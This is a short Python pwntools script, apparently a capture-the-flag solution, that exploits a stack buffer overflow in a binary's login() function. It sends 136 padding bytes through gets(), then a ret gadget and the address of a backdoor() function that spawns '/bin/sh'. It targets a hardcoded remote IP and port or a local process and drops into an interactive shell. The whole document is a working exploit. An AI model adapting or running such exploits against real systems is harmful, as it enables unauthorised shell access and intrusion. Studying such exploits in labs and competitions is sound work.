from pwn import *

context.binary = elf = ELF("./vuln")
context.arch = "amd64"

HOST = "120.27.146.76"
PORT = 20959

# login() uses a 0x80-byte stack frame and gets() writes into [rbp-0x80].
# RIP is therefore 0x80 + 8 bytes away, and one extra ret is needed to
# realign the stack before entering backdoor() -> system("/bin/sh").
OFFSET = 136
RET = 0x40101A
BACKDOOR = elf.symbols["backdoor"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    if args.QEMU:
        return process(["qemu-x86_64", elf.path])

    return process(elf.path)


def main():
    io = start()

    payload = flat(
        b"A" * OFFSET,
        RET,
        BACKDOOR,
    )

    io.sendlineafter(b"Username: ", b"AAAA")
    io.sendlineafter(b"Password: ", payload)
    io.interactive()


if __name__ == "__main__":
    main()
